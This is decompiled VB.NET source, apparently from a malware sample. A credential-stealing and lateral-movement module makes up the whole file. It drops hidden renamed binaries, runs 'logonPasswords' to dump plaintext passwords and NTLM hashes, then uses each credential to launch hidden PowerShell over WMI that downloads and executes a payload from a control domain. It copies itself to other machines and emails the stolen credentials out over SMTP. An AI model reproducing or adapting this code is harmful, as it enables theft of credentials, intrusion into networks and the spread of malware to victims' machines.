Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Net.Mail
Imports System.Reflection
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports Main.Properties

Namespace Main.Tools
	' Token: 0x02000022 RID: 34
	Public Class Credentials
		' Token: 0x060000C6 RID: 198 RVA: 0x00007D34 File Offset: 0x00005F34
		Public Shared Sub LateralMovementEmail(report As String)
			Try
				Dim mailMessage As MailMessage = New MailMessage()
				Dim smtpClient As SmtpClient = New SmtpClient(Config.SmtpServerData.ServerLinkAddress)
				mailMessage.From = New MailAddress(Config.SmtpServerData.SelectedMailFrom)
				mailMessage.[To].Add(Config.SmtpServerData.SelectedMailTo)
				mailMessage.Subject = "Lateral Movement Report"
				mailMessage.Body = vbLf & vbLf + report
				smtpClient.Port = Config.SmtpServerData.ServerPort
				smtpClient.Credentials = New NetworkCredential(Config.SmtpServerData.SelectedUsername, Config.SmtpServerData.SelectedPassword)
				smtpClient.EnableSsl = Config.SmtpServerData.SslEnable
				smtpClient.Send(mailMessage)
			Catch
			End Try
		End Sub

		' Token: 0x060000C7 RID: 199 RVA: 0x00007DD8 File Offset: 0x00005FD8
		Public Shared Function RetrieveData() As List(Of Credential)
			Try
				If IntPtr.Size = 8 Then
					Credentials.Filename = "himem_x64.exe"
					Credentials.FilenameSe = "lvl_x64.exe"
				Else
					Credentials.Filename = "himem_x86.exe"
					Credentials.FilenameSe = "lvl_x86.exe"
				End If
				If Not File.Exists(Environment.CurrentDirectory + "\lvl_x86.exe") OrElse Not File.Exists(Environment.CurrentDirectory + "\lvl_x64.exe") Then
					File.WriteAllBytes(Environment.CurrentDirectory + "\lvl_x86.exe", Resources.lvl_x86)
					File.WriteAllBytes(Environment.CurrentDirectory + "\lvl_x64.exe", Resources.lvl_x64)
					File.SetAttributes(Environment.CurrentDirectory + "\lvl_x86.exe", FileAttributes.Hidden)
					File.SetAttributes(Environment.CurrentDirectory + "\lvl_x64.exe", FileAttributes.Hidden)
				End If
				Dim text As String = "logonPasswords"
				Dim process As Process = New Process() With { .StartInfo = { .FileName = Credentials.Filename, .Arguments = text, .UseShellExecute = False, .CreateNoWindow = True, .RedirectStandardOutput = True, .WindowStyle = ProcessWindowStyle.Hidden, .StandardOutputEncoding = Encoding.GetEncoding(850) } }
				process.Start()
				Credentials.Result = process.StandardOutput.ReadToEnd()
				process.WaitForExit()
				Credentials.Result = Regex.Split(Credentials.Result, "logonPasswords")(1)
				Dim regex As Regex = New Regex("..Username\s+:\s+[^\s]+")
				Dim regex2 As Regex = New Regex("..Password\s+:\s+[^\s]+|..NTLM\s+:\s+[^\s]+")
				Dim regex3 As Regex = New Regex("..Domain\s+:\s+[^\s]+")
				Dim matchCollection As MatchCollection = regex.Matches(Credentials.Result)
				Dim matchCollection2 As MatchCollection = regex2.Matches(Credentials.Result)
				Dim matchCollection3 As MatchCollection = regex3.Matches(Credentials.Result)
				For i As Integer = 0 To matchCollection.Count - 1
					Dim credential As Credential = New Credential() With { .username = Regex.Split(matchCollection(i).ToString(), ": ")(1), .password = Regex.Split(matchCollection2(i).ToString(), ": ")(1), .Domain = Regex.Split(matchCollection3(i).ToString(), ": ")(1) }
					Credentials.credentials.Add(credential)
				Next
				Return Credentials.credentials
			Catch ex As Exception
			End Try
			Return Credentials.credentials
		End Function

		' Token: 0x060000C8 RID: 200 RVA: 0x00008054 File Offset: 0x00006254
		Public Shared Sub Exploit(c As List(Of Credential))
			Try
				For Each credential As Credential In c
					If credential.username <> "(null)" AndAlso credential.password <> "(null)" AndAlso credential.Domain <> "(null)" Then
						Dim text As String = String.Concat(New String() { " WMI ", credential.Domain, " cmd.exe /k powershell -windowstyle hidden -exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('", Config.SelectedControlDomain, Config.MalwareNameInServer, "')|iex"" ", credential.username, " ", credential.password })
						Dim process As Process = New Process() With { .StartInfo = { .FileName = Credentials.Filename, .Arguments = text, .UseShellExecute = False, .CreateNoWindow = True, .RedirectStandardOutput = True, .WindowStyle = ProcessWindowStyle.Hidden, .StandardOutputEncoding = Encoding.GetEncoding(850) } }
						process.Start()
						Credentials.Result = String.Concat(New String() { Credentials.Result, Environment.NewLine, Environment.NewLine, "SPREADING ATTEMPTS RESULTS:", Environment.NewLine, "--------------------------------------------------", Environment.NewLine, Environment.NewLine, "Domain: ", credential.Domain, Environment.NewLine, "Username: ", credential.username, Environment.NewLine, "Password: ", credential.password, Environment.NewLine })
						Credentials.Result = String.Concat(New String() { Credentials.Result, "Success: ", process.StandardOutput.ReadToEnd(), Environment.NewLine, Environment.NewLine })
						process.WaitForExit()
						Dim text2 As String = String.Concat(New String() { " \", credential.Domain, " -c ", Path.GetFileName(Assembly.GetExecutingAssembly().Location), " -u ", credential.username, " -p ", credential.password, " -h -v -accepteula - nobanner" })
						Dim process2 As Process = New Process() With { .StartInfo = { .FileName = Credentials.FilenameSe, .Arguments = text2, .UseShellExecute = False, .CreateNoWindow = True, .RedirectStandardOutput = True, .WindowStyle = ProcessWindowStyle.Hidden, .StandardOutputEncoding = Encoding.GetEncoding(850) } }
						process2.Start()
						process2.WaitForExit()
						Dim text3 As String = " \* -c " + Path.GetFileName(Assembly.GetExecutingAssembly().Location) + " -h -v -accepteula - nobanner"
						Dim process3 As Process = New Process() With { .StartInfo = { .FileName = Credentials.FilenameSe, .Arguments = text3, .UseShellExecute = False, .CreateNoWindow = True, .RedirectStandardOutput = True, .WindowStyle = ProcessWindowStyle.Hidden, .StandardOutputEncoding = Encoding.GetEncoding(850) } }
						process3.Start()
						process3.WaitForExit()
					End If
				Next
				Dim <>9__6_ As ThreadStart = Credentials.<>c.<>9__6_0
				Dim threadStart As ThreadStart = <>9__6_
				If <>9__6_ Is Nothing Then
					Dim threadStart2 As ThreadStart = Sub()
						Credentials.LateralMovementEmail(Credentials.Result)
					End Sub
					threadStart = threadStart2
					Credentials.<>c.<>9__6_0 = threadStart2
				End If
				New Thread(threadStart) With { .Priority = ThreadPriority.Lowest, .IsBackground = True }.Start()
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000C9 RID: 201 RVA: 0x00008464 File Offset: 0x00006664
		Public Shared Sub ProcessCredentialsExploit()
			If FormGame.IsElevated() Then
				Credentials.Exploit(Credentials.RetrieveData())
			End If
		End Sub

		' Token: 0x040000B3 RID: 179
		Public Shared credentials As List(Of Credential) = New List(Of Credential)()

		' Token: 0x040000B4 RID: 180
		Public Shared Filename As String

		' Token: 0x040000B5 RID: 181
		Public Shared FilenameSe As String

		' Token: 0x040000B6 RID: 182
		Public Shared Result As String = String.Empty
	End Class
End Namespace
